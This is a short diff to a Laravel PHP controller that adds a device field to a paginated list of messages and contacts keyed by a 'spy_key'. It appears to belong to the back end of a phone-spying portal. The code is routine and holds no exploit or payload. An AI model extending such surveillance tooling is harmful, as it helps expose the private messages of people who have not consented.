@@ -17,7 +17,7 @@ class MessageController extends Controller
     public function index($spy_key)
     {
         check_verification();
-        $phone_numbers = Message::where('spy_key', $spy_key)->select('phone_number', 'contact_name', 'id')->groupBy('phone_number')->paginate(10);
+        $phone_numbers = Message::where('spy_key', $spy_key)->select('phone_number', 'device', 'contact_name', 'id')->groupBy('phone_number')->paginate(10);
         $names = Message::where('spy_key', $spy_key)->select('phone_number', 'id', 'contact_name')->groupBy('phone_number')->get();
         $contacts = DB::table('contacts')->where('spy_key', $spy_key)->get();
 
@@ -30,8 +30,14 @@ class MessageController extends Controller
             }
         }
 
+        $device = "";
+        foreach ($phone_numbers as $phone_number){
+            $device = $phone_number->device;
+        }
+
         return view('portal.messages.index', compact('phone_numbers'))
-            ->with('i', (request()->input('page', 1) - 1) * 10);
+            ->with('i', (request()->input('page', 1) - 1) * 10)
+            ->with('device', $device);
 
     }
 
